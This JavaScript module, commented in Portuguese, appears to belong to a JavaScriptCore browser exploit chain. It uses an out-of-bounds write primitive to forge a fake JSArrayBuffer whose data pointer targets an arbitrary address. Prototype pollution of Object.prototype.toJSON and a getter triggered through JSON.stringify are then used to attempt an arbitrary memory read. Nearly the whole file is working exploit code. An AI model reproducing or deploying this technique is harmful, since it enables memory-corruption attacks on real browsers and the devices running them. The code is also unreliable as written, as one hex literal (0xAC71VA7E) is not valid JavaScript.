// js/script3/testFakeArrayBufferActivate.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // A variável global que referencia o ArrayBuffer OOB
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GADGET_PROPERTY_NAME_CHECKPOINT = "AAAA_GetterForFakeABActivation";

class CheckpointObjectForActivation {
    constructor(id) {
        this.id = `CheckpointActivationObj-${id}`;
        this.marker = 0xABC00CBA;
    }
}

export function toJSON_TriggerGetterForFakeABActivation() {
    const FNAME_toJSON = "toJSON_TriggerGetterForFakeABActivation";
    let returned_payload = { _variant_: FNAME_toJSON, _id_at_entry_: String(this?.id || "N/A") };
    try {
        for (const prop in this) {
            if (Object.prototype.hasOwnProperty.call(this, prop) || CheckpointObjectForActivation.prototype.hasOwnProperty(prop)) {
                returned_payload[prop] = this[prop];
            }
        }
    } catch (e) { returned_payload._ERROR_IN_LOOP_ = `${e.name}: ${e.message}`; }
    return returned_payload;
}

export async function executeFakeArrayBufferActivateTest() {
    const FNAME_TEST = "executeFakeArrayBufferActivateTest";
    logS3(`--- Iniciando Teste: Ativação Especulativa de Fake ArrayBuffer (StructureID=2) ---`, "test", FNAME_TEST);
    document.title = `Fake AB Activate (ID=2)`;

    if (JSC_OFFSETS.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID !== 2) {
        logS3(`ERRO CRÍTICO: JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID não é 2 no config.mjs! Teste abortado.`, "error", FNAME_TEST);
        return;
    }

    await triggerOOB_primitive();
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Teste abortado.", "error", FNAME_TEST);
        return;
    }

    // --- Configuração do JSArrayBuffer Falso Simplificado DENTRO de oob_array_buffer_real ---
    const fake_JSArrayBuffer_offset_in_oob_content = 0x300; // Onde nosso JSArrayBuffer falso começa no *conteúdo* de oob_ab_real
    const target_read_address = new AdvancedInt64("0x00000000", "0x00020000"); // Ex: 0x200000000 (endereço arbitrário para ler)
    const read_size_val = 0x200; // Tamanho da leitura em bytes (512)

    logS3(`Construindo JSArrayBuffer Falso (StructureID=2) no CONTEÚDO de oob_ab_real em offset [${toHex(fake_JSArrayBuffer_offset_in_oob_content)}]`, "info", FNAME_TEST);
    logS3(`  Fake AB terá m_dataPointer para: ${target_read_address.toString(true)}`, "info", FNAME_TEST);
    logS3(`  Fake AB terá m_sizeInBytes de: ${toHex(read_size_val)} bytes`, "info", FNAME_TEST);

    const structure_id_ab = JSC_OFFSETS.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID; // Deve ser 2

    try {
        // 1. Escrever StructureID (offset 0x0 do JSArrayBuffer falso)
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob_content + 0x0, structure_id_ab, 4); // DWORD
        // 2. Zerar o campo Structure* (offset 0x8)
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob_content + JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET, AdvancedInt64.Zero, 8);
        // 3. Escrever m_sizeInBytes no offset do JSArrayBuffer (ex: 0x18)
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob_content + JSC_OFFSETS.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START, read_size_val, 4); // DWORD
        // 4. Escrever m_dataPointer no offset do JSArrayBuffer (ex: 0x20)
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob_content + JSC_OFFSETS.ArrayBuffer.DATA_POINTER_COPY_OFFSET_FROM_JSARRAYBUFFER_START, target_read_address, 8); // QWORD
        // (Opcional) Escrever um ponteiro para "contents" (mesmo que os campos estejam embutidos, algumas lógicas podem checar)
        // Se CONTENTS_IMPL_POINTER_OFFSET for 0x10, vamos colocar um valor não nulo lá (ex: offset para ele mesmo + um delta)
        const fake_contents_ptr_val = new AdvancedInt64(fake_JSArrayBuffer_offset_in_oob_content + 0x40, 0); // Aponta para uma área dentro do fake AB
        oob_write_absolute(fake_JSArrayBuffer_offset_in_oob_content + JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET, fake_contents_ptr_val, 8);

        logS3(`   JSArrayBuffer Falso construído em oob_ab_real[${toHex(fake_JSArrayBuffer_offset_in_oob_content)}]`, "good", FNAME_TEST);
    } catch (e) {
        logS3(`   ERRO ao construir JSArrayBuffer Falso: ${e.message}`, "error", FNAME_TEST);
        clearOOBEnvironment();
        return;
    }

    // --- Corrupção OOB para acionar o getter e (especulativamente) "ativar" o Fake AB ---
    const corruption_offset_trigger = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
    const corruption_value_trigger = 0xBCBCBCBC;

    logS3(`Escrevendo valor trigger ${toHex(corruption_value_trigger)} em oob_ab_real[${toHex(corruption_offset_trigger)}]...`, "info", FNAME_TEST);
    try {
        oob_write_absolute(corruption_offset_trigger, corruption_value_trigger, 4);
    } catch(e) { logS3(`Erro ao escrever valor trigger OOB: ${e.message}`, "error", FNAME_TEST); clearOOBEnvironment(); return; }

    let checkpoint_obj = new CheckpointObjectForActivation(0);
    let originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForActivation.prototype, GADGET_PROPERTY_NAME_CHECKPOINT);
    let getterPollutionApplied = false;
    let ppKey_val = 'toJSON';
    let originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
    let toJSONPollutionApplied = false;
    let overall_leak_attempt_summary = "Nenhuma ativação/leitura bem-sucedida.";

    try {
        Object.defineProperty(CheckpointObjectForActivation.prototype, GADGET_PROPERTY_NAME_CHECKPOINT, {
            get: function() {
                const GETTER_FNAME = "GetterCheckpoint_TryActivateFakeAB";
                logS3(`!!!! GETTER CHECKPOINT '${GADGET_PROPERTY_NAME_CHECKPOINT}' FOI CHAMADO !!!! (ID: ${this.id})`, "vuln", GETTER_FNAME);
                this.marker = 0xAC71VA7E; // Indicar chamada

                // TENTATIVA ESPECULATIVA:
                // A corrupção OOB em [0x70] fez o motor JS reinterpretar o *global* oob_array_buffer_real
                // para usar os metadados falsos que escrevemos em seu *conteúdo* (em fake_JSArrayBuffer_offset_in_oob_content)?
                if (!oob_array_buffer_real) {
                    logS3(`   [${GETTER_FNAME}] Erro: oob_array_buffer_real (global) é null no getter.`, "error", GETTER_FNAME);
                    return "getter_oob_is_null";
                }

                logS3(`   [${GETTER_FNAME}] Tentando usar 'oob_array_buffer_real' (global) como DataView para leitura arbitrária...`, "info", GETTER_FNAME);
                logS3(`   Lembre-se: o JSArrayBuffer Falso em seu conteúdo foi configurado para ler de ${target_read_address.toString(true)} com tamanho ${toHex(read_size_val)}.`, "info", GETTER_FNAME);

                try {
                    // Se a type confusion funcionou no oob_array_buffer_real global:
                    const dv = new DataView(oob_array_buffer_real);
                    logS3(`     new DataView(oob_array_buffer_real) SUCESSO! byteLength: ${toHex(dv.byteLength)} (esperado ~${toHex(read_size_val)})`, "good", GETTER_FNAME);

                    if (dv.byteLength >= 4) {
                        const leaked_val_dword = dv.getUint32(0, true); // Lê 4 bytes do target_read_address
                        logS3(`       LEITURA ARBITRÁRIA (DWORD de ${target_read_address.toString(true)}): ${toHex(leaked_val_dword)}`, "critical", GETTER_FNAME);
                        overall_leak_attempt_summary = `LEITURA ARBITRÁRIA: *(${target_read_address.toString(true)}) = ${toHex(leaked_val_dword)}`;
                        document.title = `ARBITRARY READ SUCCESS: ${toHex(leaked_val_dword)}`;
                    } else {
                        logS3(`       DataView.byteLength é muito pequeno (${dv.byteLength}) para ler um DWORD.`, "warn", GETTER_FNAME);
                         overall_leak_attempt_summary = `DataView OK, mas byteLength pequeno: ${dv.byteLength}`;
                    }
                } catch (e_dv_oob) {
                    logS3(`     ERRO ao criar/usar DataView sobre oob_array_buffer_real: ${e_dv_oob.name} - ${e_dv_oob.message}`, "error", GETTER_FNAME);
                    overall_leak_attempt_summary = `ERRO DataView: ${e_dv_oob.message}`;
                }
                return "getter_activation_attempt_done";
            },
            configurable: true, enumerable: true
        });
        getterPollutionApplied = true;

        Object.defineProperty(Object.prototype, ppKey_val, { value: toJSON_TriggerGetterForFakeABActivation, writable: true, configurable: true, enumerable: false });
        toJSONPollutionApplied = true;

        logS3(`Tentando acionar getter em CheckpointObject para testar ativação do Fake AB...`, "info", FNAME_TEST);
        JSON.stringify(checkpoint_obj); // Aciona o getter

    } catch (e) {
        logS3(`Erro durante a configuração/execução do getter para ativação do Fake AB: ${e.message}`, "error", FNAME_TEST);
        overall_leak_attempt_summary = `Erro no setup do getter: ${e.message}`;
    } finally {
        // Cleanup
        if (toJSONPollutionApplied) {
            if (originalToJSONProtoDesc) Object.defineProperty(Object.prototype, ppKey_val, originalToJSONProtoDesc);
            else delete Object.prototype[ppKey_val];
        }
        if (getterPollutionApplied && CheckpointObjectForActivation.prototype.hasOwnProperty(GADGET_PROPERTY_NAME_CHECKPOINT)) {
            if (originalGetterDesc) Object.defineProperty(CheckpointObjectForActivation.prototype, GADGET_PROPERTY_NAME_CHECKPOINT, originalGetterDesc);
            else delete CheckpointObjectForActivation.prototype[GADGET_PROPERTY_NAME_CHECKPOINT];
        }
    }

    logS3(`Resultado da tentativa de ativação/leitura: ${overall_leak_attempt_summary}`, "test", FNAME_TEST);
    clearOOBEnvironment();
    logS3(`--- Teste de Ativação Especulativa de Fake ArrayBuffer CONCLUÍDO ---`, "test", FNAME_TEST);
    if (!document.title.includes("SUCCESS")) {
        document.title = `Fake AB Activate Done`;
    }
}
